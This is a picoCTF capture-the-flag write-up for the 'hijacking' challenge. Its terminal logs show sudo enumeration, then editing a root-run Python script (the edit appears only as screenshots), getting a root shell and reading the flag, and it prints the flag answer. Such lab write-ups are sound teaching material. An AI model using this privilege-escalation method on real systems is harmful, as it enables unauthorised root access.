# hijacking 

---

AUTHOR: THEONESTE BYAGUTANGAZA

Description
Getting root access can allow you to read the flag. Luckily there is a python file 
that you might like to play with.
Additional details will be available after launching your challenge instance.

---

Connect top the machine using the provided username and password:

---

```bash
‚ùØ ssh picoctf@saturn.picoctf.net -p 55691

The authenticity of host '[saturn.picoctf.net]:55691 ([64:ff9b::d3b:cbaf]:55691)' can't be established.
ED25519 key fingerprint is SHA256:lAxuAwDPxkngr5Aw0vqCbwmNz/+0ii8HjltkWeRcMjw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:55691' (ED25519) to the list of known hosts.
picoctf@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1016-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py

```

let's check out .server.py file

<img width="1440" alt="Screenshot 2024-06-30 at 7 44 31 PM" src="https://github.com/Lynk4/PicoCTF/assets/44930131/6a7354f7-c2c8-4812-90c7-38b653b9442c">

Basically we need to edit the .server.py file to this...

<img width="616" alt="Screenshot 2024-06-30 at 7 45 46 PM" src="https://github.com/Lynk4/PicoCTF/assets/44930131/216991ed-2f86-48b5-b05d-a7ca6433a3a9">

---

after that run it as sudo.
```bash
picoctf@challenge:~$ sudo /usr/bin/python3 /home/picoctf/.server.py
root@challenge:/home/picoctf# ls
root@challenge:/home/picoctf# cd /root
root@challenge:~# ls
root@challenge:~# ls -la
total 16
drwx------ 1 root root   22 Jun 30 14:15 .
drwxr-xr-x 1 root root   63 Jun 30 14:08 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   43 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root 1164 Jun 30 14:15 .viminfo
root@challenge:~# cat .flag.txt
picoCTF{pYth0nn_libraryH!j@CK!n9_4c188d27}
```

flag:```picoCTF{pYth0nn_libraryH!j@CK!n9_4c188d27}```

---
